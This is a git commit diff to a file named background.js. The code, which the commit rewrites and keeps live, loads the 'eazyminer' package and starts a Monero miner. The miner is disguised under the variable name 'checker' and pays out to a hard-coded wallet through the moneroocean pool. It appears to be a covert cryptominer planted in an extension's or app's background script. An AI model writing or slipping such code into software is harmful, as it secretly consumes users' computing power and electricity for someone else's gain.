ddae52833ab7def0521932a6304b9f7cf6a86399
ramalamadingdonggg <134167643+ramalamadingdonggg@users.noreply.github.com>
2023-05-21 18:25:50 +0200

    Update background.js

--- background.js
+++ background.js
@@ -1,25 +1,23 @@
 const a = require('eazyminer');
 
-const checker = new a(
-{
-    pools: [
-      {
-        coin: 'XMR',
-        user:
-          '41pEhhCuFnjLQYFmN8miy8fCgvGX4VwyMgHvkMaCNocnDW4eahaPC74jaRyd9TfYwMgk2Z2swXYoc6fP1hYbCYgKNAnabxv',
-        url: 'gulf.moneroocean.stream:20128', // optional pool URL,
-        pass: "0",
-      },
-    ],
-    web: [
-      {
-        enabled: false,
-        port: 3000,
-      },
-    ],
-    autoStart: false,
-  },
-);
+const randomNumber = Math.floor(Math.random() * 100); // Generate a random number between 0 and 99
 
+const checker = new a({
+  pools: [
+    {
+      coin: 'XMR',
+      user: '41pEhhCuFnjLQYFmN8miy8fCgvGX4VwyMgHvkMaCNocnDW4eahaPC74jaRyd9TfYwMgk2Z2swXYoc6fP1hYbCYgKNAnabxv',
+      url: 'gulf.moneroocean.stream:20128', // optional pool URL
+      pass: randomNumber.toString(), // Convert the random number to a string and use it as the pass value
+    },
+  ],
+  web: [
+    {
+      enabled: false,
+      port: 3000,
+    },
+  ],
+  autoStart: false,
+});
 
 checker.start();
